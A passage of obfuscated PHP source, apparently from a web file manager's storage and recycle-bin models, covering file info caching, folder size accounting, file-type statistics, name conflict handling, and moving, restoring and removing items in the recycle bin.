$this->metaSet($¶ä”¬ÜÅ, $€¥Ö°ßí[545], $ÖÄ Üò¢); } public function setContent($†¡Ê¦ßä, $ÙÏãÄñÕ = '') { $šÉ±ı¤â =& $_SERVER[áäÒ½¯Ç]; $µûÕÆŠ« = $this->sourceInfo($†¡Ê¦ßä); $‘ÉÁ°îß = $this->fileInfoGet($†¡Ê¦ßä); if (!$‘ÉÁ°îß || !$µûÕÆŠ«) { return !1; } $³»¤·öü = KodIO::ioFileDriverGet($šÉ±ı¤â[503] . $†¡Ê¦ßä . $šÉ±ı¤â[412]); $ï×êîÀ = Model($šÉ±ı¤â[565])->addFileByContent($ÙÏãÄñÕ, $³»¤·öü, $µûÕÆŠ«[$šÉ±ı¤â[32]]); if (!$ï×êîÀ) { return !1; } $úÒ™âÆ– = $this->fileHistory($µûÕÆŠ«, $ï×êîÀ[$šÉ±ı¤â[562]], $ï×êîÀ[$šÉ±ı¤â[79]]); if (!$úÒ™âÆ–) { return Model($šÉ±ı¤â[565])->remove($ï×êîÀ[$šÉ±ı¤â[562]]); } $this->folderSizeReset($µûÕÆŠ«[$šÉ±ı¤â[191]]); return !0; } public function fileSubstr($Šâ­‹É, $ôé†¸ùË, $ıÁ€ÚÂ) { $—‘¤âüÙ = $this->fileInfoGet($Šâ­‹É); if (!$—‘¤âüÙ) { return !1; } return IO::fileSubstr($—‘¤âüÙ[$_SERVER[áäÒ½¯Ç][87]], $ôé†¸ùË, $ıÁ€ÚÂ); } public function fileInfoGet($ùµ“òÓ—) { $ÊªĞÏ›‰ =& $_SERVER[áäÒ½¯Ç]; $í‘İ¨à¨ = $this->sourceInfo($ùµ“òÓ—); if (!$í‘İ¨à¨ || $í‘İ¨à¨[$ÊªĞÏ›‰[505]]) { return !1; } $Ó£Õóìˆ = $ÊªĞÏ›‰[569] . $í‘İ¨à¨[$ÊªĞÏ›‰[562]]; $íå›ÈÈğ = _get(self::$cacheFileInfo, $Ó£Õóìˆ); if ($íå›ÈÈğ) { return $íå›ÈÈğ; } $şŒù˜¹• = Model($ÊªĞÏ›‰[565])->fileInfo($í‘İ¨à¨[$ÊªĞÏ›‰[562]]); if ($şŒù˜¹•) { $şŒù˜¹•[$ÊªĞÏ›‰[32]] = $í‘İ¨à¨[$ÊªĞÏ›‰[32]]; } self::$cacheFileInfo[$Ó£Õóìˆ] = $şŒù˜¹•; return $şŒù˜¹•; } private function folderChildrenNumber($±ôÀ£²–) { $Š•†€Øş =& $_SERVER[áäÒ½¯Ç]; $»©úı• = $this->sourceInfo($±ôÀ£²–); $ª÷¿Ù Û = array($Š•†€Øş[680] => array($Š•†€Øş[640], $»©úı•[$Š•†€Øş[609]] . $±ôÀ£²– . $Š•†€Øş[641]), $Š•†€Øş[677] => $»©úı•[$Š•†€Øş[594]], $Š•†€Øş[524] => intval($»©úı•[$Š•†€Øş[525]]), $Š•†€Øş[674] => 1); $õ¸¡ÂÎö = $this->where($ª÷¿Ù Û)->count(); $è³ßÚØÇ = $this->where($ª÷¿Ù Û)->where(array($Š•†€Øş[674] => 0))->count(); return array($Š•†€Øş[83] => $è³ßÚØÇ, $Š•†€Øş[84] => $õ¸¡ÂÎö); } public function pathInfo($æ‹ú«‰, $ôï¨éÍ» = false) { $øëğé×ç =& $_SERVER[áäÒ½¯Ç]; $ôï¨éÍ» = !1; $æ‹ú«‰ = intval($æ‹ú«‰); if (!$æ‹ú«‰) { return !1; } $ªíØÌÆœ = $øëğé×ç[553] . intval($ôï¨éÍ») . $øëğé×ç[482] . $æ‹ú«‰; $ˆüõóş‚ = _get(self::$cachePathInfo, $ªíØÌÆœ); if ($ˆüõóş‚) { return $ˆüõóş‚; } $ÃœÆü‘ = $this->sourceInfo($æ‹ú«‰); if (!$ÃœÆü‘) { return !1; } $ÃœÆü‘ = $this->_listDataApplyItem($ÃœÆü‘, $ôï¨éÍ»); self::$cachePathInfo[$ªíØÌÆœ] = $ÃœÆü‘; return $ÃœÆü‘; } public static $cachePathInfoMore = array(); public function pathInfoMore($÷Œµì‹) { $ŸÏùšÕ¢ =& $_SERVER[áäÒ½¯Ç]; $Ó®À†äë = _get(self::$cachePathInfoMore, $÷Œµì‹); if ($Ó®À†äë) { return $Ó®À†äë; } $Ğè¶àĞ© = $this->pathInfo($÷Œµì‹); if (!$Ğè¶àĞ©) { return !1; } if ($Ğè¶àĞ©[$ŸÏùšÕ¢[505]] == $ŸÏùšÕ¢[91]) { $Ğè¶àĞ©[$ŸÏùšÕ¢[82]] = $this->folderChildrenNumber($÷Œµì‹); } self::$cachePathInfoMore[$÷Œµì‹] = $Ğè¶àĞ©; return $Ğè¶àĞ©; } public function sourceInfo($çÃŠŒ¬) { $™èÍ– =& $_SERVER[áäÒ½¯Ç]; if (!$çÃŠŒ¬) { return array(); } $çÃŠŒ¬ = intval($çÃŠŒ¬); $Êõ¡”ÇŠ = $™èÍ–[552] . $çÃŠŒ¬; $‡á´š¤— = _get(self::$cacheSourceInfo, $Êõ¡”ÇŠ); if ($‡á´š¤—) { return $‡á´š¤—; } $âµ’¡Şø = $this->where(array($™èÍ–[192] => $çÃŠŒ¬))->find(); self::$cacheSourceInfo[$Êõ¡”ÇŠ] = $âµ’¡Şø; return self::$cacheSourceInfo[$Êõ¡”ÇŠ]; } public function sourceCacheClear($­ŠÏßÜ = false) { self::cacheClear($­ŠÏßÜ); } public static function cacheClear($‰»ØÅÖ† = false) { $Î¹ªêé¦ =& $_SERVER[áäÒ½¯Ç]; if ($‰»ØÅÖ† == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$Î¹ªêé¦[552] . $‰»ØÅÖ†]); unset(self::$cachePathInfoMore[$‰»ØÅÖ†]); unset(self::$cachePathInfo[$Î¹ªêé¦[2450] . $‰»ØÅÖ†]); unset(self::$cachePathInfo[$Î¹ªêé¦[2451] . $‰»ØÅÖ†]); } public function metaSet($¢öä«øÎ, $Àô™Áº” = null, $œÖåà”Í = null) { $¨Šªëé½ = parent::metaSet($¢öä«øÎ, $Àô™Áº”, $œÖåà”Í); if ($¨Šªëé½) { $this->sourceCacheClear($¢öä«øÎ); } return $¨Šªëé½; } public function pathInfoByPath($ÄÑå¨Û©, $†«Ë—ëø) { $ş¾Óİ¾ =& $_SERVER[áäÒ½¯Ç]; $¥–Ç¾ŸŸ = !$†«Ë—ëø ? array() : explode($ş¾Óİ¾[8], trim($†«Ë—ëø, $ş¾Óİ¾[8])); $Ñâ‘Û­ = intval($ÄÑå¨Û©); foreach ($¥–Ç¾ŸŸ as $óî´Å«ı) { $¯•¸à = array($ş¾Óİ¾[191] => $Ñâ‘Û­, $ş¾Óİ¾[32] => $óî´Å«ı); $½ïßúûù = $this->field($ş¾Óİ¾[2452])->where($¯•¸à)->select(); if (!$½ïßúûù) { return !1; } $½ïßúûù = array_sort_by($½ïßúûù, $ş¾Óİ¾[525]); $Ñâ‘Û­ = intval($½ïßúûù[0][$ş¾Óİ¾[192]]); } $ª¿´°×Ö = $this->sourceInfo($Ñâ‘Û­); $this->pathInfoFilter($ª¿´°×Ö); return $ª¿´°×Ö; } protected function updateModifyTime($½¦•¨¹×) { $ÛˆéúÒô =& $_SERVER[áäÒ½¯Ç]; $Æé€°çÃ = KodUser::id(); if (!$½¦•¨¹×) { return; } if (!is_array($½¦•¨¹×)) { $½¦•¨¹× = array($½¦•¨¹×); } foreach ($½¦•¨¹× as $À±Ô¦˜ => $—³•”å) { $½¦•¨¹×[$À±Ô¦˜] = intval($—³•”å); $this->sourceCacheClear($—³•”å); } $·°‰å = array($ÛˆéúÒô[192] => array($ÛˆéúÒô[7], $½¦•¨¹×)); $²©Îõ¶² = array($ÛˆéúÒô[679] => $Æé€°çÃ, $ÛˆéúÒô[518] => time()); $this->where($·°‰å)->save($²©Îõ¶²); } public function folderSizeReset($­…‡ÎÇº, $ıŒé¡óÎ = false) { $¹„¹¿®« =& $_SERVER[áäÒ½¯Ç]; if ($this->statusIgnoreResetSpace) { return; } if (!$­…‡ÎÇº) { return; } $¥©…»Õ› = $this->sourceInfo($­…‡ÎÇº); $¼å§¯î¨ = $¹„¹¿®«[2453] . $­…‡ÎÇº; if (!$¥©…»Õ› || !$¥©…»Õ›[$¹„¹¿®«[192]]) { return; } CacheLock::lock($¼å§¯î¨, 20); if ($ıŒé¡óÎ === !1) { $this->sourceCacheClear($­…‡ÎÇº); $¥©…»Õ› = $this->sourceInfo($­…‡ÎÇº); $ş¿¯ÊÃ¡ = array($¹„¹¿®«[497] => $­…‡ÎÇº, $¹„¹¿®«[524] => 0); $ƒâ¯¡± = $this->where($ş¿¯ÊÃ¡)->sum($¹„¹¿®«[79]); $ıŒé¡óÎ = intval($ƒâ¯¡±) - intval($¥©…»Õ›[$¹„¹¿®«[79]]); } if ($ıŒé¡óÎ == 0) { return CacheLock::unlock($¼å§¯î¨); } $ıèîÄŒó = $this->parentLevelArray($¥©…»Õ›[$¹„¹¿®«[609]]); if (!$ıèîÄŒó) { $ıèîÄŒó = array(); } $ıèîÄŒó[] = $¥©…»Õ›[$¹„¹¿®«[192]]; $ş¿¯ÊÃ¡ = array($¹„¹¿®«[192] => array($¹„¹¿®«[512], $ıèîÄŒó)); if ($ıŒé¡óÎ < 0) { $ş¿¯ÊÃ¡[$¹„¹¿®«[79]] = array($¹„¹¿®«[1131], abs($ıŒé¡óÎ)); } $this->where($ş¿¯ÊÃ¡)->setAdd($¹„¹¿®«[79], $ıŒé¡óÎ); CacheLock::unlock($¼å§¯î¨); if (!$¥©…»Õ›[$¹„¹¿®«[594]] || $¥©…»Õ›[$¹„¹¿®«[594]] == $¹„¹¿®«[239]) { return; } $æÉı¾‚Š = $¹„¹¿®«[2454] . $¥©…»Õ›[$¹„¹¿®«[189]] . $¹„¹¿®«[4] . $¥©…»Õ›[$¹„¹¿®«[594]]; $û·²§‡° = array($¥©…»Õ›[$¹„¹¿®«[189]], $¥©…»Õ›[$¹„¹¿®«[594]]); TaskRun::timeLimitCall($æÉı¾‚Š, $¹„¹¿®«[2455], $û·²§‡°, 1.5); } public function folderSizeResetChildren($å¬¸¡¼š) { $ÄøåêİÀ =& $_SERVER[áäÒ½¯Ç]; $this->sourceCacheClear($å¬¸¡¼š); $¿Ãê—é­ = $this->sourceInfo($å¬¸¡¼š); if (!$¿Ãê—é­) { return; } $ş­Õ½¦ = array($ÄøåêİÀ[674] => 1, $ÄøåêİÀ[677] => $¿Ãê—é­[$ÄøåêİÀ[594]], $ÄøåêİÀ[680] => array($ÄøåêİÀ[640], $¿Ãê—é­[$ÄøåêİÀ[609]] . $å¬¸¡¼š . $ÄøåêİÀ[641])); $„‹£‹‹ = $ÄøåêİÀ[2456]; $ìŠô¿éÇ = $this->field($„‹£‹‹)->where($ş­Õ½¦)->select(); $ş­Õ½¦[$ÄøåêİÀ[505]] = 0; $Â‘íÈù¯ = $this->field($„‹£‹‹)->where($ş­Õ½¦)->select(); if (!$Â‘íÈù¯) { return; } $ìŠô¿éÇ[] = $¿Ãê—é­; $ìŠô¿éÇ = array_to_keyvalue($ìŠô¿éÇ, $ÄøåêİÀ[192]); foreach ($ìŠô¿éÇ as $¦‹¯Á¤Ğ => $äÔ÷»•) { $ìŠô¿éÇ[$¦‹¯Á¤Ğ][$ÄøåêİÀ[2457]] = $ìŠô¿éÇ[$¦‹¯Á¤Ğ][$ÄøåêİÀ[79]]; $ìŠô¿éÇ[$¦‹¯Á¤Ğ][$ÄøåêİÀ[79]] = 0; } foreach ($Â‘íÈù¯ as $äÔ÷»•) { $ı‚Ñ›ó‹ = $äÔ÷»•[$ÄøåêİÀ[191]] . $ÄøåêİÀ[12]; if (!isset($ìŠô¿éÇ[$ı‚Ñ›ó‹])) { continue; } if ($äÔ÷»•[$ÄøåêİÀ[525]] == $ìŠô¿éÇ[$ı‚Ñ›ó‹][$ÄøåêİÀ[525]]) { $ìŠô¿éÇ[$ı‚Ñ›ó‹][$ÄøåêİÀ[79]] += $äÔ÷»•[$ÄøåêİÀ[79]]; } } foreach ($ìŠô¿éÇ as $äÔ÷»•) { $Ù“ĞÄ¬ = $this->parentLevelArray($äÔ÷»•[$ÄøåêİÀ[609]]); foreach ($Ù“ĞÄ¬ as $ı‚Ñ›ó‹) { $ı‚Ñ›ó‹ = $ı‚Ñ›ó‹ . $ÄøåêİÀ[12]; if (!isset($ìŠô¿éÇ[$ı‚Ñ›ó‹])) { continue; } if ($äÔ÷»•[$ÄøåêİÀ[525]] == $ìŠô¿éÇ[$ı‚Ñ›ó‹][$ÄøåêİÀ[525]]) { $ìŠô¿éÇ[$ı‚Ñ›ó‹][$ÄøåêİÀ[79]] += $äÔ÷»•[$ÄøåêİÀ[79]]; } } } $­Ä€ûñØ = array(); foreach ($ìŠô¿éÇ as $äÔ÷»•) { if ($äÔ÷»•[$ÄøåêİÀ[79]] == $äÔ÷»•[$ÄøåêİÀ[2457]]) { continue; } $­Ä€ûñØ[] = array($ÄøåêİÀ[192], $äÔ÷»•[$ÄøåêİÀ[192]], $ÄøåêİÀ[79], $äÔ÷»•[$ÄøåêİÀ[79]]); } $this->saveAll($­Ä€ûñØ); } public function userSpaceReset($Ç÷¯éş¢ = false) { $ƒÚµœ«Î =& $_SERVER[áäÒ½¯Ç]; $‹ß¶ã“Ö = $this->where(array($ƒÚµœ«Î[189] => self::TYPE_USER, $ƒÚµœ«Î[594] => $Ç÷¯éş¢, $ƒÚµœ«Î[505] => 0))->sum($ƒÚµœ«Î[79]); $‹ß¶ã“Ö = !$‹ß¶ã“Ö || $‹ß¶ã“Ö <= 0 ? 0 : $‹ß¶ã“Ö; Model($ƒÚµœ«Î[602])->userEdit($Ç÷¯éş¢, array($ƒÚµœ«Î[2122] => $‹ß¶ã“Ö)); } public function targetSpaceUpdate($ù˜îÍÍ£, $›×¼¤ºÎ) { $ï›”íêù =& $_SERVER[áäÒ½¯Ç]; if (!$›×¼¤ºÎ) { return; } if (!in_array($ù˜îÍÍ£, array(self::TYPE_USER, self::TYPE_GROUP))) { return; } $ŒœÚ«³® = $this->targetSpaceSize($ù˜îÍÍ£, $›×¼¤ºÎ); if ($ù˜îÍÍ£ == self::TYPE_USER) { Model($ï›”íêù[602])->userEdit($›×¼¤ºÎ, array($ï›”íêù[2122] => $ŒœÚ«³®)); } else { if ($ù˜îÍÍ£ == self::TYPE_GROUP) { Model($ï›”íêù[610])->groupEdit($›×¼¤ºÎ, array($ï›”íêù[2122] => $ŒœÚ«³®)); } } } public function targetSpaceSize($€º¢Ú®º, $œ×¹“°ë) { $³îèµ¡ =& $_SERVER[áäÒ½¯Ç]; $¥ƒÓˆÆ = 0; $§ä„ê¬ = $this->targetSourceRoot($€º¢Ú®º, $œ×¹“°ë, !0); foreach ($§ä„ê¬ as $ãâô©îç) { if (!$ãâô©îç) { continue; } $¥ƒÓˆÆ += floatval($ãâô©îç[$³îèµ¡[79]]); $–éÁêñÏ = array($³îèµ¡[680] => array($³îèµ¡[640], $³îèµ¡[618] . $ãâô©îç[$³îèµ¡[192]] . $³îèµ¡[641])); $šÁĞºÕÍ = Model($³îèµ¡[523])->field($³îèµ¡[511])->where($–éÁêñÏ)->select(); $šÁĞºÕÍ = array_to_keyvalue($šÁĞºÕÍ, $³îèµ¡[12], $³îèµ¡[192]); $šÁĞºÕÍ = array_unique(array_filter($šÁĞºÕÍ)); if ($šÁĞºÕÍ) { $–éÁêñÏ = array($³îèµ¡[511] => array($³îèµ¡[512], $šÁĞºÕÍ)); $¥ƒÓˆÆ += floatval($this->where($–éÁêñÏ)->sum($³îèµ¡[79])); } } $¥ƒÓˆÆ = !$¥ƒÓˆÆ || $¥ƒÓˆÆ <= 0 ? 0 : $¥ƒÓˆÆ; return $¥ƒÓˆÆ; } public function allFileTypeProfile() { return $this->fileTypeProfile(!1, !1); } public function userFileTypeProfile($£úÙÅ’å) { return $this->fileTypeProfile($£úÙÅ’å, SourceModel::TYPE_USER); } public function groupFileTypeProfile($æ¢Èìå¤) { return $this->fileTypeProfile($æ¢Èìå¤, SourceModel::TYPE_GROUP); } private function fileTypeProfile($şÍ°Şş, $Ã¼—¾ú±) { $™Ø§ÜÁù =& $_SERVER[áäÒ½¯Ç]; $›ÈÚã×§ = $™Ø§ÜÁù[2458] . $şÍ°Şş . $™Ø§ÜÁù[11] . $Ã¼—¾ú±; $îÁŸ…­ = Cache::get($›ÈÚã×§); if ($îÁŸ…­) { return $îÁŸ…­; } $Æ±şô€ = array($™Ø§ÜÁù[674] => 0); if ($şÍ°Şş != !1) { $Æ±şô€[$™Ø§ÜÁù[594]] = $şÍ°Şş; $Æ±şô€[$™Ø§ÜÁù[189]] = $Ã¼—¾ú±; } $±éˆé½ = array(); $ÅÂî§– = $this->field(array($™Ø§ÜÁù[2384] => $™Ø§ÜÁù[2089], $™Ø§ÜÁù[2459] => $™Ø§ÜÁù[79]))->where($Æ±şô€)->find(); $±éˆé½[$™Ø§ÜÁù[2460]] = array($™Ø§ÜÁù[2461] => LNG($™Ø§ÜÁù[2460]), $™Ø§ÜÁù[2462] => intval($ÅÂî§–[$™Ø§ÜÁù[2089]]), $™Ø§ÜÁù[645] => intval($ÅÂî§–[$™Ø§ÜÁù[79]])); $¼ÌÖ»› = KodIO::fileTypeList(); foreach ($¼ÌÖ»› as $ÓôÂûûÁ => $óî›ÈË‚) { $Æ±şô€[$™Ø§ÜÁù[506]] = $this->fileTypeWhere($ÓôÂûûÁ); $ÅÂî§– = $this->field(array($™Ø§ÜÁù[2384] => $™Ø§ÜÁù[2089], $™Ø§ÜÁù[2459] => $™Ø§ÜÁù[79]))->where($Æ±şô€)->find(); $±éˆé½[$ÓôÂûûÁ] = array($™Ø§ÜÁù[2461] => $óî›ÈË‚[$™Ø§ÜÁù[32]], $™Ø§ÜÁù[2462] => intval($ÅÂî§–[$™Ø§ÜÁù[2089]]), $™Ø§ÜÁù[645] => intval($ÅÂî§–[$™Ø§ÜÁù[79]])); } Cache::set($›ÈÚã×§, $±éˆé½, 1200); return $±éˆé½; } public function fileNameExist($¾åùÄÌ, $™ÙäÕÖì) { $‘Å”Ñœº =& $_SERVER[áäÒ½¯Ç]; $Ç¼’ĞÇ = $this->field($‘Å”Ñœº[2463])->where(array($‘Å”Ñœº[191] => $¾åùÄÌ, $‘Å”Ñœº[32] => $™ÙäÕÖì, $‘Å”Ñœº[525] => 0))->find(); return is_array($Ç¼’ĞÇ) ? $Ç¼’ĞÇ[$‘Å”Ñœº[192]] : !1; } public function childList($³ù‘¤Ë÷) { $…æËô·İ =& $_SERVER[áäÒ½¯Ç]; $¥¦çş¯ = $…æËô·İ[2435] . $³ù‘¤Ë÷; if (isset(self::$cacheChildList[$¥¦çş¯])) { return self::$cacheChildList[$¥¦çş¯]; } $Ñ úÚ²è = array($…æËô·İ[191] => intval($³ù‘¤Ë÷), $…æËô·İ[525] => 0); $€²æ¤ = $this->where($Ñ úÚ²è)->select(); $€²æ¤ = $€²æ¤ ? $€²æ¤ : array(); self::$cacheChildList[$¥¦çş¯] = $€²æ¤; foreach ($€²æ¤ as $ˆœ›€±) { $¥¦çş¯ = $…æËô·İ[552] . $ˆœ›€±[$…æËô·İ[192]]; self::$cacheSourceInfo[$¥¦çş¯] = $ˆœ›€±; } return $€²æ¤; } public function fileNameAuto($É¶Òü€…, $ßâË¹‡, $¹è‘èüÇ = REPEAT_RENAME, $ÀÒÇ—× = false) { $Î¦™öàÍ =& $_SERVER[áäÒ½¯Ç]; $…˜ØÂÊ§ = get_path_ext($ßâË¹‡); $ıĞ°©— = $…˜ØÂÊ§ ? get_path_ext_name($ßâË¹‡) . $Î¦™öàÍ[2464] . $…˜ØÂÊ§ : $ßâË¹‡ . $Î¦™öàÍ[480]; $ıÔÍ‡ = array($Î¦™öàÍ[191] => $É¶Òü€…, $Î¦™öàÍ[525] => 0, $Î¦™öàÍ[32] => array($Î¦™öàÍ[479], $ıĞ°©—)); $ïÇ’£¨ = $this->field($Î¦™öàÍ[32])->where($ıÔÍ‡)->select(); $şæĞĞÍô = array_to_keyvalue($ïÇ’£¨, $Î¦™öàÍ[12], $Î¦™öàÍ[32]); return $this->fileNameAutoGet($şæĞĞÍô, $ßâË¹‡, $¹è‘èüÇ, $ÀÒÇ—×); } public function fileNameAutoGet($¼šš‰†Â, $¿¯´ãÁÑ, $şÔ’ÜìÛ, $ò•àşÈÌ) { $ŸšËÜöæ =& $_SERVER[áäÒ½¯Ç]; if ($şÔ’ÜìÛ == REPEAT_REPLACE || !$¼šš‰†Â || !in_array_not_case($¿¯´ãÁÑ, $¼šš‰†Â) || $ò•àşÈÌ && $şÔ’ÜìÛ != REPEAT_RENAME_FOLDER) { return $¿¯´ãÁÑ; } if ($şÔ’ÜìÛ == REPEAT_SKIP) { return !1; } $é•æŸÂæ = $ŸšËÜöæ[10] . get_path_ext($¿¯´ãÁÑ); $é•æŸÂæ = $é•æŸÂæ == $ŸšËÜöæ[10] || $ò•àşÈÌ ? $ŸšËÜöæ[12] : $é•æŸÂæ; for ($öçŸ¨ö¯ = 1; $öçŸ¨ö¯ <= count($¼šš‰†Â) + 1; $öçŸ¨ö¯++) { $å½Ã¸ µ = substr($¿¯´ãÁÑ, 0, strlen($¿¯´ãÁÑ) - strlen($é•æŸÂæ)); $Ò¸—İÊò = $å½Ã¸ µ . "\x28{$öçŸ¨ö¯}\x29{$é•æŸÂæ}"; if (!in_array_not_case($Ò¸—İÊò, $¼šš‰†Â)) { return $Ò¸—İÊò; } } } } class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\165\162\143\x65\137\162\145\x63\171\x63\154\145"; protected $dataAuto = array(array("\x63\x72\145\141\164\x65\124\x69\155\x65", "\x74\x69\155\x65", "\x69\156\x73\145\162\x74", "\146\165\156\x63\x74\x69\x6f\156")); public function listData($²İÜ©ê¦ = false) { $·„íáÒ =& $_SERVER[áäÒ½¯Ç]; $²İÜ©ê¦ = $²İÜ©ê¦ ? $²İÜ©ê¦ : USER_ID; $Í •ñ“Æ = $this->where(array($·„íáÒ[1918] => $²İÜ©ê¦))->select(); return array_to_keyvalue($Í •ñ“Æ, $·„íáÒ[12], $·„íáÒ[192]); } public function moveToRecycle($ßî†ö¯) { $Ê¸”Í¼ =& $_SERVER[áäÒ½¯Ç]; $É­³Ú‘ñ = Model($Ê¸”Í¼[1482]); $”ş”åÎ = $É­³Ú‘ñ->sourceInfo($ßî†ö¯); if (!$”ş”åÎ || $”ş”åÎ[$Ê¸”Í¼[525]] == $Ê¸”Í¼[91]) { return; } $­¦Å–ë = array($Ê¸”Í¼[511] => $ßî†ö¯, $Ê¸”Í¼[1918] => USER_ID, $Ê¸”Í¼[676] => $”ş”åÎ[$Ê¸”Í¼[189]], $Ê¸”Í¼[677] => $”ş”åÎ[$Ê¸”Í¼[594]], $Ê¸”Í¼[680] => $”ş”åÎ[$Ê¸”Í¼[609]]); $this->add($­¦Å–ë); $this->recycleMove($ßî†ö¯, 1); if ($”ş”åÎ[$Ê¸”Í¼[505]] == $Ê¸”Í¼[91]) { $µ¿Ï×ñœ = array($Ê¸”Í¼[680] => array($Ê¸”Í¼[640], $”ş”åÎ[$Ê¸”Í¼[609]] . $ßî†ö¯ . $Ê¸”Í¼[641])); $É­³Ú‘ñ->where($µ¿Ï×ñœ)->setField($Ê¸”Í¼[525], 1); } } public function clear() { $this->remove(!1); } public function remove($¹ÕÇõù÷ = false, $Á€ßÎÀ˜ = false) { $ÏÄìäè¦ =& $_SERVER[áäÒ½¯Ç]; $Á€ßÎÀ˜ = $Á€ßÎÀ˜ ? $Á€ßÎÀ˜ : USER_ID; $Ş™Õşá« = Model($ÏÄìäè¦[1482]); $å““Ü¦ª = $this->listData($Á€ßÎÀ˜); $¹ÕÇõù÷ = $¹ÕÇõù÷ === !1 ? !1 : $¹ÕÇõù÷; $Õï¿‘—ö = array(); foreach ($å““Ü¦ª as $íÔ·­ä¤) { if ($¹ÕÇõù÷ != !1 && !in_array($íÔ·­ä¤, $¹ÕÇõù÷)) { continue; } $Â¦­ÊÖ = $Ş™Õşá«->sourceInfo($íÔ·­ä¤); $Ş™Õşá«->remove($íÔ·­ä¤, !1); $£ÃÁ¹­¼ = $Â¦­ÊÖ[$ÏÄìäè¦[189]] . $ÏÄìäè¦[11] . $Â¦­ÊÖ[$ÏÄìäè¦[594]]; $Õï¿‘—ö[$£ÃÁ¹­¼] = array($ÏÄìäè¦[676] => $Â¦­ÊÖ[$ÏÄìäè¦[189]], $ÏÄìäè¦[594] => $Â¦­ÊÖ[$ÏÄìäè¦[594]]); $this->where(array($ÏÄìäè¦[192] => $íÔ·­ä¤))->delete(); } foreach ($Õï¿‘—ö as $ÈÇŞü‘é) { $Ş™Õşá«->targetSpaceUpdate($ÈÇŞü‘é[$ÏÄìäè¦[189]], $ÈÇŞü‘é[$ÏÄìäè¦[594]]); } } public function restore($öÆÓ ò = false) { $¾»™‹™ = $this->listData(); $this->_restoreSource($¾»™‹™, $öÆÓ ò); } public function removeUserAll($œÜüÀ½) { $this->remove(!1, $œÜüÀ½); } public function restoreItem($¦µÀ½³Í) { $this->_restoreSource(array($¦µÀ½³Í), array($¦µÀ½³Í)); } private function _restoreSource($¡Ëïü‡, $Øë¢ÆÉ) { $ç µ¸ø× =& $_SERVER[áäÒ½¯Ç]; $Ää‰¢©™ = Model($ç µ¸ø×[1482]); $Øë¢ÆÉ = $Øë¢ÆÉ == !1 ? !1 : $Øë¢ÆÉ; if (!$¡Ëïü‡) { return !0; } $Ôã·ÕÕ½ = array(); foreach ($¡Ëïü‡ as $Õ¥¶’ª˜) { if ($Øë¢ÆÉ != !1 && !in_array($Õ¥¶’ª˜, $Øë¢ÆÉ)) { continue; } $£ƒ¹ÉÇŠ = $Ää‰¢©™->sourceInfo($Õ¥¶’ª˜); $õÕèŒ¹« = $Ää‰¢©™->sourceInfo($£ƒ¹ÉÇŠ[$ç µ¸ø×[191]]); if ($õÕèŒ¹«[$ç µ¸ø×[525]] == $ç µ¸ø×[91]) { continue; } $Ää‰¢©™->lockMoveStart($Õ¥¶’ª˜); $this->recycleMove($Õ¥¶’ª˜, 0); if ($£ƒ¹ÉÇŠ[$ç µ¸ø×[505]] == $ç µ¸ø×[91]) { $Å¹¤³±¶ = array($ç µ¸ø×[680] => array($ç µ¸ø×[640], $£ƒ¹ÉÇŠ[$ç µ¸ø×[609]] . $Õ¥¶’ª˜ . $ç µ¸ø×[641])); $Ää‰¢©™->where($Å¹¤³±¶)->setField($ç µ¸ø×[525], 0); $this->restoreFolderChildren($Õ¥¶’ª˜, $¡Ëïü‡); } $this->where(array($ç µ¸ø×[192] => $Õ¥¶’ª˜))->delete(); $Ää‰¢©™->folderSizeReset($£ƒ¹ÉÇŠ[$ç µ¸ø×[191]]); $Ôã·ÕÕ½[] = $£ƒ¹ÉÇŠ[$ç µ¸ø×[191]]; if ($£ƒ¹ÉÇŠ[$ç µ¸ø×[505]] == $ç µ¸ø×[91]) { $Ôã·ÕÕ½[] = $Õ¥¶’ª˜; } $Ää‰¢©™->lockMoveEnd($Õ¥¶’ª˜); } $Ää‰¢©™->updateModifyTime($Ôã·ÕÕ½); } private function restoreFolderChildren($»¶ºÇóş, $Ş‚™ê÷) { $ş³é„× =& $_SERVER[áäÒ½¯Ç]; $ˆÈŞÎä° = Model($ş³é„×[1482]); $÷Œ¬È­¹ = array($ş³é„×[192] => array($ş³é„×[7], array())); foreach ($Ş‚™ê÷ as $äÎÒÄ˜„) { if ($äÎÒÄ˜„ == $»¶ºÇóş) { continue; } if (!$ˆÈŞÎä°->isParentOf($»¶ºÇóş, $äÎÒÄ˜„)) { continue; } $ù—Í«® = $ˆÈŞÎä°->sourceInfo($äÎÒÄ˜„); if ($ù—Í«®[$ş³é„×[505]] == $ş³é„×[91]) { $÷Œ¬È­¹[] = array($ş³é„×[680] => array($ş³é„×[640], $ù—Í«®[$ş³é„×[609]] . $äÎÒÄ˜„ . $ş³é„×[641])); } else { $÷Œ¬È­¹[$ş³é„×[192]][1][] = $äÎÒÄ˜„; } } if (!$÷Œ¬È­¹[$ş³é„×[192]][1]) { unset($÷Œ¬È­¹[$ş³é„×[192]]); } if (!$÷Œ¬È­¹) { return; } if (is_array($÷Œ¬È­¹[$ş³é„×[192]]) && is_array($÷Œ¬È­¹[$ş³é„×[192]][1])) { $÷Œ¬È­¹[$ş³é„×[192]][1] = array_unique($÷Œ¬È­¹[$ş³é„×[192]][1]); } $÷Œ¬È­¹[$ş³é„×[1116]] = $ş³é„×[2233]; $ˆÈŞÎä°->where($÷Œ¬È­¹)->setField($ş³é„×[525], 1); } private function recycleMove($„Ç×¬±ç, $ÖçëÖ€ª = 1) { $ı¾Î½·È =& $_SERVER[áäÒ½¯Ç]; $¨¤ÑŸ¤® = Model($ı¾Î½·È[1482]); $êúßìÔ = Model($ı¾Î½·È[2465]); $èĞë¬ÂÚ = array($ı¾Î½·È[192] => $„Ç×¬±ç); if ($ÖçëÖ€ª) { $¨¤ÑŸ¤®->where($èĞë¬ÂÚ)->setField($ı¾Î½·È[525], 1); $êúßìÔ->eventRecycle($„Ç×¬±ç, $ı¾Î½·È[2466]); } else { $›Ì©—° = $¨¤ÑŸ¤®->where($èĞë¬ÂÚ)->find(); $’êíòğ© = $›Ì©—°[$ı¾Î½·È[505]] == $ı¾Î½·È[91]; $âÏ«û”Æ = $¨¤ÑŸ¤®->fileNameAuto($›Ì©—°[$ı¾Î½·È[191]], $›Ì©—°[$ı¾Î½·È[32]], REPEAT_RENAME_FOLDER, $’êíòğ©); if ($âÏ«û”Æ != 